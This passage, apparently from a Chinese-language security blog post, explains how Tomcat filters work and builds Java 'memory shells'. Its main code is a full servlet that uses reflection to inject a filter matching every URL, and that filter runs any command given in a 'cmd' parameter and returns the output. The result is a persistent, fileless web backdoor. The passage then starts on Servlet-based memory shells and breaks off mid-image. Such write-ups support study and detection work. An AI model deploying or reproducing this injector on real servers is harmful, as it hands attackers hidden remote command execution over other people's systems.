<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</span><br><span class="line"></span><br><span class="line">FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息</span><br><span class="line"></span><br><span class="line">FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern</span><br><span class="line"></span><br><span class="line">FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter</span><br><span class="line"></span><br><span class="line">WebXml：存放 web.xml 中内容的类</span><br><span class="line"></span><br><span class="line">ContextConfig：Web应用的上下文配置类</span><br><span class="line"></span><br><span class="line">StandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper</span><br><span class="line"></span><br><span class="line">StandardWrapperValve：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</span><br></pre></td></tr></table></figure></div>

<p>流程</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\image-20210331212905616.png"
                      alt="image-20210331212905616"
                ></p>
<h3 id="大概写个内存马"><a href="#大概写个内存马" class="headerlink" title="大概写个内存马"></a>大概写个内存马</h3><h4 id="先简单理理思路"><a href="#先简单理理思路" class="headerlink" title="先简单理理思路"></a>先简单理理思路</h4><p><strong>在了解了上述逻辑后，在应用程序中动态的添加一个 filter 的思路就清晰了：</strong></p>
<blockquote>
<ul>
<li>调用 <code>ApplicationContext</code> 的 <code>addFilter</code> 方法创建 <code>filterDefs</code> 对象，需要反射修改应用程序的运行状态，加完之后再改回来；</li>
<li>调用 <code>StandardContext</code> 的 <code>filterStart</code> 方法生成 <code>filterConfigs</code>；</li>
<li>调用 <code>ApplicationFilterRegistration</code> 的 <code>addMappingForUrlPatterns</code> 生成 <code>filterMaps</code>；</li>
<li>为了兼容某些特殊情况，将我们加入的 <code>filter</code> 放在 <code>filterMaps</code> 的第一位，可以自己修改 <code>HashMap</code> 中的顺序，也可以在自己调用 <code>StandardContext</code> 的 <code>addFilterMapBefore</code> 直接加在 <code>filterMaps</code> 的第一位。</li>
</ul>
<p>换一种解释</p>
<ol>
<li>根据请求的 URL 从 FilterMaps 中找出与之 URL 对应的 Filter 名称</li>
<li>根据 Filter 名称去 FilterConfigs 中寻找对应名称的 FilterConfig</li>
<li>找到对应的 FilterConfig 之后添加到 FilterChain中，并且返回 FilterChain</li>
<li>filterChain 中调用 internalDoFilter 遍历获取 chain 中的 FilterConfig ，然后从 FilterConfig 中获取 Filter，然后调用 Filter 的 doFilter 方法</li>
</ol>
</blockquote>
<p><strong>可以去看其他师傅写的好的，自己修改修改</strong></p>
<blockquote>
<p>su18师傅写的，做的是访问后使index页面的id+3</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/su18/MemoryShell/commit/38ffaf43782176c47044f588164923c3c5a36b8b#diff-0d6379fd4a157c3267bcf44412fe7df7129c825ccf76abc63786a926c6ae8b98" >项目地址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>胡师傅写的</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/AmTrain-Ricky/JavaMemShellLearn/blob/main/TomcatMemShell/src/main/java/com/tomcat/memshell/Filter/MemFilter.java" >JavaMemShellLearn&#x2F;MemFilter.java at main · AmTrain-Ricky&#x2F;JavaMemShellLearn (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><strong>自己写的</strong></p>
<p>先科普一下Filter建法</p>
<p><strong>自定义 filter（基本上需要的内容）</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter 初始化创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行过滤操作&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>不做过多解释，都能看懂</p>
<p>然后在<code>web.xml</code>中注册我们的filter，这里我们设置url-pattern为 我们的项目地址才行，这里因为用了servlet来加载（我这么理解），所以可以写servlet标签就行,要写filter标签也行，这里大概给个范例</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>KoishiAddTomcatFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.tomcat.memshell.Filter.KoishiMemFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>KoishiAddTomcatFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/koishiFilter<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>KoishiAddTomcatFilter<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.tomcat.memshell.Filter.KoishiMemFilter<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>KoishiAddTomcatFilter<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/koishiFilter<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h4 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a><strong>正式开始</strong></h4><p><strong>思路</strong></p>
<blockquote>
<ol>
<li>先拿到 context </li>
<li>创建一个恶意 Filter</li>
<li>利用 FilterDef 对 Filter 进行一个封装</li>
<li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li>
<li>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</li>
</ol>
</blockquote>
<blockquote>
<p><strong>每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启</strong></p>
</blockquote>
<p><strong>前面说到当组装我们的过滤器链的时候 ，是从context中获取到的 FiltersMaps，所以先拿到 context</strong></p>
<p>当我们能直接获取 request 的时候，我们这里可以直接使用如下方法</p>
<p>（当 Web 容器启动的时候会为每个 Web 应用都创建一个 ServletContext 对象，代表当前 Web 应用）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">appctx.setAccessible(true);</span><br><span class="line">    // ApplicationContext 为 ServletContext 的实现类</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">stdctx.setAccessible(true);</span><br><span class="line"> // 这样我们就获取到了 context </span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>如果没有request对象的话可以从当前线程中获取</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/114625962" >https://zhuanlan.zhihu.com/p/114625962 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>从MBean中获取</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://scriptboy.cn/p/tomcat-filter-inject/" >https://scriptboy.cn/p/tomcat-filter-inject/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><strong>Filter 内存马</strong></p>
<p>Filter实现<code>doFilter</code>恶意方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tomcat.util.ClassUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiMemFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;koishi&quot;</span>;</span><br><span class="line">        <span class="comment">// 通过 request 获取 ServletContext 对象</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">        <span class="comment">// 首先判断名字是否存在，如果不存在我们就进行注入</span></span><br><span class="line">        <span class="keyword">if</span> (servletContext.getFilterRegistration(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">            流程 ApplicationContextFacade-&gt;ApplicationContext-&gt;StandardContext</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="comment">// 1.获取 context</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// ApplicationContext 为 ServletContext 的实现类,这里下面通过反射获取 servletContext 的 context 中的具体属性值</span></span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                <span class="comment">//这里同理，继续反射获取context中的属性值</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">applicationField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                applicationField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">//最终在这里 这样我们就获取到了 StandardContext 下的 HashMap 类型的 filterDefs</span></span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) applicationField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2.创建自定义的Filter对象</span></span><br><span class="line">            <span class="comment">// Tomcat 包下的 ClassUtil 的继承了类加载器，可以用来专门加载Spring下的类</span></span><br><span class="line">            <span class="comment">// Class&lt;?&gt; filterClass = ClassUtil.getClass(ClassUtil.FILTER_STRING);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//恶意 filter</span></span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                            <span class="comment">//Process process = new ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,req.getParameter(&quot;cmd&quot;)).start();</span></span><br><span class="line">                            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                            servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                            process.destroy();</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建FilterDef</span></span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">                filterDef.setFilterName(filterName);</span><br><span class="line">                <span class="comment">//filterDef.setFilter((Filter)filterClass.newInstance());</span></span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                <span class="comment">//filterDef.setFilterClass(filterClass.getName());</span></span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建ApplicationFilterConfig</span></span><br><span class="line">                Constructor&lt;?&gt;[] constructor = ApplicationFilterConfig.class.getDeclaredConstructors();</span><br><span class="line">                constructor[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">config</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor[<span class="number">0</span>].newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建FilterMap</span></span><br><span class="line">                <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">                filterMap.setFilterName(filterName);</span><br><span class="line">                <span class="comment">// * 或者 /* 都会匹配所有url路径，这就使内存马再任意页面都可执行</span></span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * Filter拦截方式配置</span></span><br><span class="line"><span class="comment">                 * REQUEST：默认值。浏览器直接请求资源（下面设置成这个的目的应该也是为了直接请求资源，不做过多处理）</span></span><br><span class="line"><span class="comment">                 * FORWARD：转发访问资源</span></span><br><span class="line"><span class="comment">                 * INCLUDE：包含访问资源</span></span><br><span class="line"><span class="comment">                 * ERROR：错误跳转资源</span></span><br><span class="line"><span class="comment">                 * ASYNC：异步访问资源</span></span><br><span class="line"><span class="comment">                 * */</span></span><br><span class="line">                filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 反射将ApplicationFilterConfig放入StandardContext中的filterConfigs中</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">configfield</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">                configfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// 直接赋值会把别的服务给覆盖掉, 取出再赋值</span></span><br><span class="line">                HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs = (HashMap&lt;String, ApplicationFilterConfig&gt;) configfield.get(standardContext);</span><br><span class="line">                filterConfigs.put(filterName, config);</span><br><span class="line"></span><br><span class="line">                standardContext.addFilterDef(filterDef);</span><br><span class="line">                <span class="comment">// 将我们的 filterMap 写到第一个</span></span><br><span class="line">                standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">                resp.getOutputStream().write(<span class="string">&quot;inject success ！恭喜&quot;</span>.getBytes());</span><br><span class="line">                resp.getOutputStream().flush();</span><br><span class="line">                resp.getOutputStream().close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter 初始化创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行过滤操作&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>







<h2 id="三、Servlet-内存马"><a href="#三、Servlet-内存马" class="headerlink" title="三、Servlet 内存马"></a>三、Servlet 内存马</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/118492214" >可以参考的文章（个人感觉讲的相当nice） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Servlet 是 Server Applet（服务器端小程序）的缩写，用来读取客户端发送的数据，处理并返回结果。也是最常见的 Java 技术之一。</p>
<p>与 Filter 相同，本小节也仅仅讨论使用 ServletContext 的相关方法添加 Servlet。还是首先来看一下实现类 <code>ApplicationContext</code> 的 <code>addServlet</code> 方法。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1-16673128653255.png"
                      alt="1"
                ></p>
<p>与上一小节看到的 <code>addFilter</code> 方法十分类似，这个过程简单一点，只有两部走：</p>
<blockquote>
<ul>
<li><code>ApplicationServletRegistration</code> 的 <code>addMapping</code> 方法调用 <code>StandardContext#addServletMapping</code> 方法，在 mapper 中添加 URL 路径与 Wrapper 对象的映射（Wrapper 通过 this.children 中根据 name 获取）</li>
<li>同时在 <code>servletMappings</code> 中添加 URL 路径与 name 的映射。</li>
</ul>
</blockquote>
<h3 id="简单记录一下Servlet的周期"><a href="#简单记录一下Servlet的周期" class="headerlink" title="简单记录一下Servlet的周期"></a>简单记录一下Servlet的周期</h3><h4 id="Servlet的生成与动态添加"><a href="#Servlet的生成与动态添加" class="headerlink" title="Servlet的生成与动态添加"></a>Servlet的生成与动态添加</h4><p><strong>Servlet的生成与动态添加依次进行了以下步骤（详情见参考文章）：</strong></p>
<blockquote>
<ol>
<li><p>通过 context.createWapper() 创建 Wapper 对象；</p>
</li>
<li><p>设置 Servlet 的 LoadOnStartUp 的值；</p>
</li>
<li><p>设置 Servlet 的 Name；</p>
</li>
<li><p>设置 Servlet 对应的 Class；</p>
</li>
<li><p>将 Servlet 添加到 context 的 children 中；</p>
</li>
<li><p>将 url 路径和 servlet 类做映射。</p>
</li>
</ol>
</blockquote>
<h4 id="Servlet-装载过程"><a href="#Servlet-装载过程" class="headerlink" title="Servlet 装载过程"></a>Servlet 装载过程</h4><p>在 <code>org.apache.catalina.coreStandardWapper#loadServlet()</code> 下断点调试：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png"
                      alt="img"
                ></p>
<p>回溯到 <code>org.apache.catalina.core.StandardContext#startInternal</code>方法中可以看到，是在加载完Listener和Filter之后，才装载Servlet：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-16673738253923.png"
                      alt="img"
                ></p>
<p>前面已经完成了将所有 servlet 添加到 context 的 children 中，this.findChildren()即把所有Wapper（负责管理Servlet）传入loadOnStartup()中处理，可想而知loadOnStartup()就是负责动态添加Servlet的一个函数：<br><img  
                     lazyload
                     src="/images/loading.svg"
